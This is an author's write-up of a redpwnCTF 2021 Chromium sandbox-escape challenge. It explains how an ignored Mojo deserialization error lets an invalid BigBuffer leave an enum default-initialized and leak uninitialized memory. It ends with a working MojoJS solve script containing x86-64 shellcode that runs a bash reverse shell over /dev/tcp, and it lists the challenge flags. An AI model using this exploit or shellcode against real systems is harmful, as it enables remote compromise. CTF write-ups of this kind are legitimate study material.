---
title: Empires and Deserts
description: Abusing Mojo deserialization in the Chromium sandbox. 
tags:
  - Chrome SBX
---

This is an author writeup for the paired Chrome sandbox escape I made [for redpwnCTF 2021](https://github.com/redpwn/redpwnctf-2021-challenges/tree/master/pwn/empires), `Empires` and `Deserts`. 

When writing this challenge, I wanted to create a sandbox escape where the solution is not obvious. In other words, the difficulty of the challenge arises not from exploiting the vulnerability - but in finding the vulnerability itself. 

<!--more-->

## Introduction

I think most good challenges have a thesis behind them. They explore a previously undiscovered avenue of thought, opening up new possibilities for exploitation. For example, [Teleport from Google CTF 2020](https://ctftime.org/task/12818) asks the question: what can we do with an arbitrary read in browser land? 

This challenge was designed with a similar philosophy. In this case, the question is: what can we do if we ignore the return value of a `.ReadXXX` during Mojo deserialization. 

## Mojo Deserialization

Unfortunately, as I found out as I was writing this challenge, the answer to that question is: not a lot. 

First, it's important to understand how Mojo deserialization works. The Mojo [documentation on Type Mapping](https://chromium.googlesource.com/chromium/src/+/HEAD/mojo/public/cpp/bindings/README.md#type-mapping) does a good job of explaining how this happens, so I won't repeat what they said there. 

In short, Mojo allows you to map types defined in `.mojom` to any type you want. For example, you might want to map the `struct Rect` to a more easily manipulated `gfx::Rect`. 

```
struct Rect {
  int32 x;
  int32 y;
  int32 width;
  int32 height;
};
```

This way, you don't have to write deserialization code on every Mojo interface that interacts with the mojom Rect type. 

During deserialization, nested members that require further deserialization are read with a `.ReadFieldName(&field)` call. This allows mojom types to easily define recursive deserialization relationships. 

The `ReadFieldName` call will return a boolean representing the status of deserialization. This allows the deserialization code to validate the authenticity of an object. Intuitively, this gives the deserialization a way to say, "the values I were provided were garbage, I can't deserialize a valid object". For example, a `gfx::Rect` might only be valid is the width is non-negative. 

Hence, we arrive at the thesis of this challenge: *What happens when we ignore these deserialization errors?* 

In terms of how this was implemented in the challenge, this is the definition for the `Sand` object. 

```
// The lone and level sands stretch far away.
struct Sand {
  array<Wreck> wrecks;
};
```

Here is the deserialization code for `Sand`.

```c++
bool StructTraits<blink::mojom::SandDataView, std::vector<mojo::StructPtr<blink::mojom::Wreck>>>::Read(
    blink::mojom::SandDataView data,
    std::vector<mojo::StructPtr<blink::mojom::Wreck>>* out) {
  if (!data.ReadWrecks(out)) {
    NOTREACHED();
  }

  return true;
}
```

Note that `NOTREACHED` is a debug check, and will be ignored in production builds and thus won't trigger in our challenge. This was a reference to the [ConvertToJavaBitmap vulnerability](https://bugs.chromium.org/p/project-zero/issues/detail?id=2112) which was exploited in the wild around November 2020, where a similar invalid assumption existed about `NOTREACHED()`. 

Thus, the deserialization code ignores the return value of the deserialization of an array of `mojo::StructPtr`s. 

## Exploitation

Another observation is that they correctness of the `Ozymandias` interface depends on the validity of the Enum, `ptr->type`. 

```c++
    std::unique_ptr<uint8_t[]> data{new uint8_t[ptr->size]};

    // inspired by crbug.com/1151865
    if (getenv("CTF_CHALLENGE_EASY_MODE") == nullptr) {
      if (ptr->size < ptr->length_to_use) continue;
    }

    switch (ptr->type) {
      case blink::mojom::DesertType::DESOLATE:
        // TODO(notdeghost): fix uninitialized data read
        memset(data.get(), data.get()[0], ptr->size);

        if (ptr->data) {
          if (ptr->data->size() >= ptr->size) {
            memcpy(data.get(), ptr->data->data(), ptr->size);
          }
        }
        break;
      case blink::mojom::DesertType::EMPTY:
        memset(data.get(), 0, ptr->size);
        break;
    }
```

If the enum value is not one of the two defined values, the data buffer will be untouched, returning uninitialized memory back to the renderer. 

Note that in this challenge, the goal was to guess the value of a statically initialized `base::UnguessableToken`. Thus, a uninitialized memory leak would be enough to win.

## Deserialization in Depth

What actually happens when you call `ReadWrecks`? As always, we go back to the source! Note that in this case, the source is [Jinja templates...](https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/tools/bindings/generators/cpp_templates/). 

However, before we explore this call, we need to look at what happens before. Mojo message parsing occurs in two stages, validation and deserialization. The implication is that our payload must pass validation, which is unfortunately quite strict. This is also the reason why I asserted previously that the possibilities for exploitation was "not a lot". 

Validation occurs in the generated `::Validate` mojom methods. This validates for things like not-nullable types, internal struct header size, etc. 

For example, this is an excerpt from the generated `desert.mojom-shared.cc`. 

```c++
bool Wreck_Data::Validate(
    const void* data,
    mojo::internal::ValidationContext* validation_context) {
  if (!data)
    return true;
  if (!ValidateUnversionedStructHeaderAndSizeAndClaimMemory(
          data, 40, validation_context)) {
    return false;
  }

  // NOTE: The memory backing |object| may be smaller than |sizeof(*object)| if
  // the message comes from an older version.
  const Wreck_Data* object = static_cast<const Wreck_Data*>(data);
  ALLOW_UNUSED_LOCAL(object);

  if (!mojo::internal::ValidateInlinedUnion(object->data, validation_context))
    return false;
```

Array validation occurs in [array\_internal.h](https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/cpp/bindings/lib/array_internal.h). Specifically, the `Array_Data::Validate` method will check the array size, number of elements, and the length for [fixed-length arrays](https://chromium.googlesource.com/chromium/src/+/HEAD/mojo/public/tools/bindings/README.md#primitive-types). 

An unfortunate consequence of this is that we are unable to mess with the array size definition, as the length is validated before any of our deserialization code is hit. The initial idea I had for this challenge was modifying MojoJS array serialization code. 

```c++
    if (!validation_context->IsValidRange(data, sizeof(ArrayHeader))) {
      ReportValidationError(validation_context,
                            VALIDATION_ERROR_ILLEGAL_MEMORY_RANGE);
      return false;
    }
    const ArrayHeader* header = static_cast<const ArrayHeader*>(data);
    if (header->num_elements > Traits::kMaxNumElements ||
        header->num_bytes < Traits::GetStorageSize(header->num_elements)) {
      ReportValidationError(validation_context,
                            VALIDATION_ERROR_UNEXPECTED_ARRAY_HEADER);
      return false;
    }
```

With validation out of the way, we know that all the members of our serialized data must be structurally valid. For example, we can't have missing fields. On the other hand, there is additional deserialization logic which can fail. 

When deserialization of a field fails, the Mojo code will immediately abort deserialization of later fields. Thus, the rest of the fields will be default-initialized. In this scenario, the ordering of the members of our vulnerable struct is very important.

```mojom
struct Wreck {
  uint32 size;
  uint32 length_to_use;
  mojo_base.mojom.BigBuffer? data;

  DesertType type;
};
```

Note how the `DesertType` field comes after all the other fields, most notably the `mojo_base.mojom.BigBuffer` field. If we can get the `data` to fail deserialization (not validation, just deserialization), then our enum will be default constructed. Thus, we will be able to leak uninitalized data and solve the challenge!

To do this we can look at the deserialization code for BigBuffer, which is found in [big_buffer_mojom_traits.cc](https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/cpp/base/big_buffer_mojom_traits.cc). From the `::Read` method, we observe that we can simply pass in a `INVALID_BUFFER` to get the deserialization to fail. 

```c++
    case mojo_base::mojom::BigBufferDataView::Tag::INVALID_BUFFER:
      // Always reject an invalid buffer in deserialization.
      return false;
```

In MojoJS, this would be as follows. 

```javascript
const payload = {
  ...other_fields,
  // note that this type will be default in initialized
  // the value we set for it does not matter
  type: blink.mojom.DesertType.EMPTY,
  data: {
    $tag: mojoBase.mojom.BigBuffer.Tags.invalidBuffer,
    invalidBuffer: true
  }
}
```

Note that the default initialized enum only works because of the explicit Enum definitions. 

```
// Desert (noun)
enum DesertType {
  // 1. A barren or desolate area
  DESOLATE = 0x1337,
  // 2. An empty or forsaken place
  EMPTY = 0x7331
};
```

For completeness, here is the definition of `DesertType` in `desert.mojom-shared.h`. 

```
enum class DesertType : int32_t {

  DESOLATE = 4919,

  EMPTY = 29489,
  kMinValue = 4919,
  kMaxValue = 29489,
};
```

Note that Mojo deserialization also validates (prior to deserialization) the Enum as a known value, unless the Enum is marked as [\[Extensible\]](https://chromium.googlesource.com/chromium/src/+/HEAD/mojo/public/tools/bindings/README.md#attributes)

```
  static bool IsKnownValue(int32_t value) {
    switch (value) {
      case 4919:
      case 29489:
        return true;
    }
    return false;
  }
```

Otherwise, we would be able to pass an unknown value to the interface directly and the challenge would be trivial. 
## Summary

This challenge asks the question: what happens when we silence Mojo deserialization code errors?

The intended solution involves sending an invalid `BigBuffer` to abort deserialization, default-initializing the `DesertType` enum which results in an infoleak. 

From my discussion with competitors who solved this challenge, I don't believe there were any alternate solutions. 
## Solve Script

This is the reference solution: 

```html
<script src="/mojojs/mojo_bindings.js"></script>
<script src="/mojojs/gen/third_party/blink/public/mojom/desert.mojom.js"></script>
<script>
  const log = msg => {
    fetch("/log?log=" + encodeURIComponent(msg));
  }

  const sleep = ms => new Promise(res => setTimeout(res, ms));

  window.onerror = e => log(e);

  (async () => {
  try{

  const IS_EASY = false;
  const easy_offset = IS_EASY ? 100: 0;

  const ptrs = [];

  for (let i = 0; i < easy_offset + 2; i++) {
    const ptr = new blink.mojom.OzymandiasPtr();
    Mojo.bindInterface(blink.mojom.Ozymandias.name, mojo.makeRequest(ptr).handle);

    ptrs.push(ptr);
  }

  await sleep(100);

  ptrs[easy_offset + 0].ptr.reset();

  const { decay } = await ptrs[1].despair({
    wrecks: [
      {
        size: 0x100,
        lengthToUse: IS_EASY ? 0x200: 0x100,
        type: blink.mojom.DesertType.EMPTY,
        data: IS_EASY ? undefined: {
          $tag: mojoBase.mojom.BigBuffer.Tags.invalidBuffer,
          invalidBuffer: true
        }
      }
    ]
  });

  const leak = new BigUint64Array(new Uint8Array(decay[0]["$data"]).buffer);

  ptrs[1].visage("\x48\x31\xd2\x52\x48\x8d\x05\x31\x00\x00\x00\x50\x48\x8d\x05\x26\x00\x00\x00\x50\x48\x8d\x05\x14\x00\x00\x00\x50\x48\x89\xe6\x48\x8d\x3d\x09\x00\x00\x00\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x2d\x63\x00/bin/bash -i >& /dev/tcp/localhost/1337 0>&1\x00".split("").map(a => a.charCodeAt(0)), {
    high: leak[(IS_EASY ? 0x100 / 8: 0) + 2],
    low: leak[(IS_EASY ? 0x100 / 8: 0) + 3]
  });

  }catch(e){
    log("error");
    log(": " + e.stack);
  }
  })();

</script>
```


## Flavortext

The flavortext for this challenge was chosen from <https://theanarchistlibrary.org/library/anonymous-desert>, a rather interesting article a debate friend sent me previously. 

As usual, I used a flag pair for my paired challenges: 
```
flag{c1vili53d_man_ha5_march3d_3qHD1}
flag{and_l3ft_a_d35ert_Kx8xc}
```

Taken from: 
> Civilised man has marched across the face of the earth and left a desert in his footprints.
